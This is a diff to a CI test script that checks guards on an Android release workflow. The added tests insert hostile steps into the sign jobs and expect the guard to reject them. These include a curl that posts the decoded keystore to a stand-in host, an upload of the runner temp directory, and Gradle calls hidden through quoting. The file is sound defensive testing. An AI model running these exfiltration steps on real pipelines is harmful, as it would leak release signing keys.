@@ -2,7 +2,7 @@
 # Checks the CI guards against broken inputs: each case must make its guard fail, and the real files must still pass. Needs yq and
 # python3, no Gradle and no network. Runs in the ci lane (run-partition.sh ci), so a guard that stops rejecting a case fails a pull request.
 #   check-cleartext-sources.sh   cleartext allowed outside src/debug/ (#1406, #1441)
-#   check-workflow-guards.sh     comment-run trusted gate, release refusal order and signing environment (#1407, #1408, #1442, #1451, #1465, #1470, #1481, #1482, #1493)
+#   check-workflow-guards.sh     comment-run trusted gate, release refusal order, signing environment and sign-job steps (#1407, #1408, #1442, #1451, #1465, #1470, #1481, #1482, #1493, #1531, #1532)
 #   sign-release.sh              the hash, secrets and version-code checks that come before the APK is signed (#1493)
 #   close-refresh-pr.sh          the refresh pull request is closed and the comment posted once (#1396, #1443)
 #
@@ -100,6 +100,11 @@ mutate() {
     if cmp -s ".github/workflows/$1" "$work/workflows/$1"; then fail "the mutation of $1 changed nothing: $2"; fi
 }
 guard_with() { WORKFLOWS_DIR=$work/workflows "$guards"; }
+expect_environment_error() {
+    # expect_environment_error <name> <pattern>: the guard rejects the workflows and its message matches the pattern.
+    local name=$1 output
+    if output=$(guard_with 2>&1); then fail "$name was accepted"; elif ! grep -q "$2" <<<"$output"; then fail "$name was rejected for another reason: $output"; fi
+}
 expect_pass "the real workflows" "$guards"
 rm -rf "$work/workflows"
 cp -R .github/workflows "$work/workflows"
@@ -212,8 +217,11 @@ for early in '{"run": "echo BASH_ENV=/tmp/x >> $GITHUB_ENV"}' '{"run": "echo /tm
     mutate release.yml "$steps = [$early] + $steps"
     expect_fail "a step before the refusal: $early" guard_with
 done
+# The refusal check alone accepts a second pinned checkout; the guard's other checks pass it too, so the sign job's step allowlist is what rejects it.
 mutate release.yml "$steps = [{$checkout}] + $steps"
-expect_pass "a second pinned checkout before the refusal" guard_with
+expect_fail "a second pinned checkout in a sign job" guard_with
+mutate release.yml '.jobs.publish.steps = [{"uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1", "with": {"persist-credentials": false, "fetch-depth": 0}}] + .jobs.publish.steps'
+expect_pass "a second pinned checkout in the publish job, which reads no signing secret" guard_with
 # No other workflow may read the signing secrets: a second workflow on tag pushes would sign with no refusal. Other secrets stay allowed by name.
 for read in '${{ secrets.LENSLY_KEYSTORE_PASS }}' "\${{ secrets['lumio_keystore_b64'] }}" '${{ toJSON(secrets) }}'; do
     mutate nightly.yml ".env.X = \"$read\""
@@ -240,8 +248,8 @@ mutate release.yml '.jobs.sign_lensly.steps += [{"name": "Report", "if": "always
 expect_fail "a step that reads no secret with if: always()" guard_with
 mutate release.yml '.jobs.sign_lensly.steps += [{"name": "Report", "IF": "always()", "run": "true"}]'
 expect_fail "a step that reads no secret with IF: always()" guard_with
-mutate release.yml '.jobs.sign_lensly.steps += [{"name": "Report", "run": "true"}]'
-expect_pass "a step after the refusal with only name and run" guard_with
+mutate release.yml '.jobs.publish.steps += [{"name": "Report", "run": "true"}]'
+expect_pass "a step after the refusal with only name and run in a job that reads no signing secret" guard_with
 cleanup='(.jobs.sign_lensly.steps[] | select(.name == "Delete the decoded keystore"))'
 for change in '.if = "failure()"' '.if = "always() || true"' '.if = "${{ always() }}"' 'del(.if)' '.IF = "always()"' '.continue-on-error = true' '.env.X = "1"' '.run = "echo ${{ secrets.LENSLY_KEYSTORE_PASS }}"'; do
     mutate release.yml "$cleanup |= ($change)"
@@ -383,7 +391,7 @@ for step in "$cache, \"with\": {\"key\": \"\${{ secrets.LENSLY_KEYSTORE_PASS }}\
     expect_fail "a step after the refusal with a secret outside the env of a run step: $step" guard_with
 done
 mutate release.yml "$steps += [{\"name\": \"Late\", \"run\": \"true\", \"env\": {\"K\": \"\${{ secrets.LENSLY_KEYSTORE_PASS }}\"}}]"
-expect_pass "a run step after the refusal with a secret in its env" guard_with
+expect_environment_error "a run step after the refusal with a secret in its env, which is not one of the sign job's allowlisted steps" 'steps must be exactly'
 # A YAML merge key hides keys from yq, so any "<<" key fails, in release.yml and in every other workflow; a comment or a heredoc does not (#1482).
 insert_after() {
     # insert_after <file> <exact line> <line to add after it>
@@ -496,11 +504,6 @@ expect_pass "a refusal with an id" guard_with
 
 # --- Signing secrets live in the release environment, in jobs that run no Gradle (#1493, and the advisory on repository-level secrets).
 # The old release.yml, one job that built and signed with repository secrets and no environment, must stay rejected.
-expect_environment_error() {
-    # expect_environment_error <name> <pattern>: the guard rejects the workflows and its message matches the pattern.
-    local name=$1 output
-    if output=$(guard_with 2>&1); then fail "$name was accepted"; elif ! grep -q "$2" <<<"$output"; then fail "$name was rejected for another reason: $output"; fi
-}
 rm -rf "$work/workflows"
 cp -R .github/workflows "$work/workflows"
 cp scripts/ci/fixtures/release-single-job.yml "$work/workflows/release.yml"
@@ -531,8 +534,55 @@ mutate release.yml '.jobs.publish.steps += [{"name": "Late", "run": "true", "env
 expect_environment_error "the publish job reading a keystore secret" 'without environment: release'
 mutate release.yml '.jobs.build.if = "always()"'
 expect_environment_error "a build job that runs on always()" 'not one of the expressions listed in JOB_IF'
-mutate release.yml '.jobs.sign_lumio.steps += [{"name": "Report", "run": "true"}]'
-expect_pass "a step after the refusal with only name and run in a sign job" guard_with
+
+# --- A job that reads a signing secret has exactly the allowlisted steps (#1531): checkout, refusal, download-artifact, the sign script,
+# the keystore cleanup, upload-artifact. Each extra or changed step is rejected, wherever it sits.
+expect_steps_error() { expect_environment_error "$1" 'steps must be exactly'; }
+for job in sign_lensly sign_lumio; do
+    s=".jobs.$job.steps"
+    exfil='{"name": "Report", "run": "curl -sS --data-binary @\"$RUNNER_TEMP/release.keystore\" https://example.invalid"}'
+    mutate release.yml "$s = $s[0:5] + [$exfil] + $s[5:]"
+    expect_steps_error "$job with a run step between the sign script and the cleanup"
+    mutate release.yml "$s = $s[0:4] + [$exfil] + $s[4:]"
+    expect_steps_error "$job with a run step between the signing step and the cleanup"
+    mutate release.yml "$s += [$exfil]"
+    expect_steps_error "$job with a run step after the upload"
+    mutate release.yml "$s = $s[0:3] + [$exfil] + $s[3:]"
+    expect_steps_error "$job with a run step before the signing step"
+    mutate release.yml "$s += [{\"uses\": \"actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9\", \"with\": {\"name\": \"keystore\", \"path\": \"/home/runner/work/_temp/\"}}]"
+    expect_steps_error "$job with a second upload-artifact step"
+    mutate release.yml "($s[] | select(.uses == \"actions/upload-artifact*\") | .with.path) = \"/home/runner/work/_temp/\""
+    expect_steps_error "$job uploading another path"
+    mutate release.yml "($s[] | select(.uses == \"actions/download-artifact*\") | .with.name) = \"other\""
+    expect_steps_error "$job downloading another artifact"
+    mutate release.yml "($s[] | select(.uses == \"actions/upload-artifact*\") | .uses) = \"actions/upload-artifact@v7\""
+    expect_steps_error "$job with an upload-artifact not pinned by SHA"
+    mutate release.yml "($s[] | select(.name == \"Check, align and sign the APK\") | .run) = \"bash scripts/ci/sign-release.sh; true\""
+    expect_steps_error "$job with a signing step that runs more than the script"
+    mutate release.yml "($s[] | select(.name == \"Check, align and sign the APK\") | .env.BASH_ENV) = \"/tmp/x\""
+    expect_steps_error "$job with a signing step with an extra env variable"
+    mutate release.yml "($s[] | select(.name == \"Delete the decoded keystore\") | .run) = \"true\""
+    expect_steps_error "$job with a cleanup step that does not delete the keystore"
+    mutate release.yml "del($s[] | select(.name == \"Delete the decoded keystore\"))"
+    expect_steps_error "$job without the cleanup step"
+    mutate release.yml "$s = [$s[0], $s[1], $s[3], $s[2], $s[4], $s[5]]"
+    expect_steps_error "$job with the download and the sign step swapped"
+    mutate release.yml "$s += [{\"uses\": \"./evil\"}]"
+    expect_steps_error "$job with a local action"
+done
+# A job that reads no signing secret keeps its freedom: the build and publish jobs have many steps.
+expect_pass "the real workflows, after the step mutations" "$guards"
+
+# --- The Gradle ban in a job that reads a signing secret matches the word as a token, not as a substring (#1532).
+# Each of these hides Gradle behind quoting, a backslash or an invisible character; the steps are the real ones, so only the ban can reject them.
+for hidden in './gr""adlew :app:assembleRelease' "./gr''adlew" './gr\adlew' './gradlew' 'gradle build' 'g"r"adle' $'./gradle\xe2\x80\x8bw'; do
+    HIDDEN="sign lensly $hidden" mutate release.yml '.jobs.sign_lensly.name = strenv(HIDDEN)'
+    expect_environment_error "a sign job that names Gradle as: $hidden" 'runs Gradle'
+done
+for word in 'gradlefree' 'upgradle' 'degradlew' 'gradle_free'; do
+    HIDDEN="sign lensly $word" mutate release.yml '.jobs.sign_lensly.name = strenv(HIDDEN)'
+    expect_pass "a sign job whose name has a word that only contains gradle: $word" guard_with
+done
 
 # --- sign-release.sh: the hash check, the secrets check and the version-code check come before anything is signed.
 signer=$root/scripts/ci/sign-release.sh
